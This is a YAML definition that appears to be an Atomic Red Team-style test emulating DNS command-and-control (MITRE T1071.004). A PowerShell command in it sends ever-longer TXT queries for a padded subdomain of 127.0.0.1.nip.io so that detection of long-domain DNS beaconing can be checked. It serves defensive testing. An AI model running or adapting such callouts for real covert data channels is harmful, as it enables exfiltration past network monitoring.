- id: 97677d1e-788e-5bb0-9501-bffb8e50c123
  name: Soumaia ART Tests - DNS Long Domain Query
  description: "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout."
  tactic: command-and-control
  technique:
    attack_id: T1071.004
    name: 'Application Layer Protocol: DNS'
  platforms:
    windows:
      psh:
        command: |-
          Set-Location "PathToAtomicsFolder"
          .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT
